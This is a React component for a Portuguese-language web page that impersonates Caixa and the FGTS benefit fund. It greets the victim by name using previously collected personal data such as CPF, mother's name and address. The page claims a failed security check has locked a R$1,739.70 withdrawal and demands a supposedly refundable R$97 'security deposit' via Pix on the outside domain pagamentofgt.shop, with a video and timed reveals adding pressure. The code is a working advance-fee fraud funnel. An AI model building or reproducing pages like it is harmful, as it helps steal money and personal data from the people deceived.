import { useEffect, useState } from "react";
import logo from "../assets/caixalogo.png";
import logofgts from "../assets/fgts2.png";
import { IoIosWarning, IoMdCheckmarkCircle } from "react-icons/io";
import { Helmet } from "react-helmet";
import { UserData } from "../types/userData";
import pix from "../assets/pix.png";

export function PagamentoUpsell() {
    const [displayedAmount, setDisplayedAmount] = useState(0);
    const saqueTotal = 1739.70; // Valor do saque disponível

    const [, setIsVisible] = useState(false);

    useEffect(() => {
        const SECONDS_TO_DISPLAY = 44;
        let attempts = 0;
        let elsDisplayed = false;
        const alreadyDisplayedKey = `alreadyElsDisplayed${SECONDS_TO_DISPLAY}`;
        const alreadyElsDisplayed = localStorage.getItem(alreadyDisplayedKey);

        const showHiddenElements = () => {
            elsDisplayed = true;
            setIsVisible(true);
            localStorage.setItem(alreadyDisplayedKey, "true");
        };

        const startWatchVideoProgress = () => {
            if (
                typeof window.smartplayer === "undefined" ||
                !(window.smartplayer.instances && window.smartplayer.instances.length)
            ) {
                if (attempts >= 10) return;
                attempts += 1;
                setTimeout(() => startWatchVideoProgress(), 1000);
                return;
            }

            window.smartplayer.instances[0].on("timeupdate", () => {
                if (elsDisplayed || window.smartplayer.instances[0].smartAutoPlay) return;
                if (window.smartplayer.instances[0].video.currentTime < SECONDS_TO_DISPLAY) return;
                showHiddenElements();
            });
        };

        if (alreadyElsDisplayed === "true") {
            setTimeout(() => showHiddenElements(), 100);
        } else {
            startWatchVideoProgress();
        }
    }, []);

    const [userData, setUserData] = useState<UserData>({
        nome: "",
        cpf: "",
        dataNascimento: "",
        email: "",
        cep: "",
        cidade: "",
        estado: "",
        nomeMae: "",
        rua: "",
        numero: ""
    });

    useEffect(() => {
        const storedUserData = localStorage.getItem("userData");
        if (storedUserData) {
            setUserData(JSON.parse(storedUserData));
        }
    }, []);

    // Animação do valor do saque
    useEffect(() => {
        const interval = setInterval(() => {
            setDisplayedAmount((prev) => (prev < saqueTotal ? prev + 50 : saqueTotal));
        }, 50);
        return () => clearInterval(interval);
    }, [saqueTotal]);

    return (
        <div className="min-h-screen flex flex-col items-center bg-gray-50 text-gray-900">
            <Helmet>
                <title>Verificação de Segurança - Calção</title>
            </Helmet>

            {/* Cabeçalho com logotipo, saudação e logo FGTS */}
            <header className="flex w-full flex-col p-6 space-y-4 bg-[#025bab] shadow-lg">
                <div className="flex items-center justify-between w-full">
                    <div className="flex items-center space-x-3">
                        <img width={34} src={logo} alt="Logo Caixa" />
                        <span className="text-white font-semibold text-lg">Olá, {userData?.nome.split(" ")[0]}</span>
                    </div>
                    <img src={logofgts} alt="Logo FGTS" width={65} />
                </div>
            </header>

            {/* Conteúdo principal */}
            <main className="flex flex-col items-center justify-center text-center px-4 py-6 space-y-2 md:space-y-10">
                <h1 className="text-3xl font-semibold text-gray-800 leading-tight">
                    FALHA NA VERIFICAÇÃO DE SEGURANÇA
                </h1>

                {/* Alerta de segurança */}
                <div className="flex items-center justify-center space-x-2 text-red-600">
                    <IoIosWarning size={100} />
                    <p className="text-lg font-medium">
                        Por medida de segurança, a liberação do seu saldo está temporariamente travada.
                    </p>
                </div>

                {/* Explicação sobre o calção */}
                <div className="text-left max-w-3xl space-y-4">
                    <p className="text-lg text-gray-600">
                        Para garantir que sua conta e dados estão 100% seguros, é necessário um pagamento de calção de <strong>R$97,00</strong>.
                    </p>
                    <p className="text-lg text-gray-600">
                        Este valor é um depósito de segurança, e <strong>será totalmente reembolsado</strong> após a finalização do processo de verificação.
                    </p>

                    <h2 className="text-3xl text-center font-semibold text-gray-800 leading-tight">
                        ENTENDA O CALÇÃO DE SEGURANÇA
                    </h2>


                    <div className="w-full  py-4">
                        <div dangerouslySetInnerHTML={{ __html: '<div id="vid_673b8a8f97a137000c273c25" style="position: relative; width: 100%; padding: 56.25% 0 0;"> <img id="thumb_673b8a8f97a137000c273c25" src="https://images.converteai.net/19e779a9-9bff-4dff-b541-9918122b88f8/players/673b8a8f97a137000c273c25/thumbnail.jpg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: block;" alt="thumbnail"> <div id="backdrop_673b8a8f97a137000c273c25" style=" -webkit-backdrop-filter: blur(5px); backdrop-filter: blur(5px); position: absolute; top: 0; height: 100%; width: 100%; "></div> </div>' }} />
                        <Helmet>
                            <script type="text/javascript" id="scr_673b8a8f97a137000c273c25"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/19e779a9-9bff-4dff-b541-9918122b88f8/players/673b8a8f97a137000c273c25/player.js", s.async=!0,document.head.appendChild(s); </script>
                        </Helmet>
                    </div>

                    <p className="text-lg text-gray-600 mb-4">
                        Essa medida é para garantir que sua transação seja segura e sem problemas, proporcionando a você total proteção durante todo o processo.
                    </p>
                </div>

                {/* Animação do valor */}
                <div className="my-6">
                    <p className="text-xl mb-2 text-gray-500">Valor disponível para saque:</p>
                    <p className="text-6xl font-semibold text-green-600">R$ {displayedAmount.toFixed(2)}</p>
                </div>

                {/* Botão de pagamento */}
                <a href="https://pay.pagamentofgt.shop/P5LNZ8qkBPzGaRy" className="w-full">
                    <button className="bg-green-500 text-xl w-full hover:bg-green-600 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200 mt-6">
                        PAGAR CALÇÃO DE R$97 E LIBERAR MEU SALDO
                    </button>
                </a>

                {/* Explicação sobre o Pix */}
                <div className="flex flex-col items-center mt-8 space-y-4">
                    <img src={pix} alt="Logo Pix" className="w-24 mt-4 mb-4" />
                    <p className="text-sm text-gray-600 flex items-center">
                        <IoMdCheckmarkCircle className="inline mr-2 text-green-500" />
                        Pagamento via Pix para garantir o processo rápido e seguro.
                    </p>
                    <p className="text-xs text-gray-500 max-w-md">
                        O pagamento do calção será processado imediatamente através do Pix. Uma vez confirmado, seu saldo será liberado em minutos. Este valor será reembolsado assim que o processo for concluído.
                    </p>
                </div>
            </main>
        </div>
    );
}
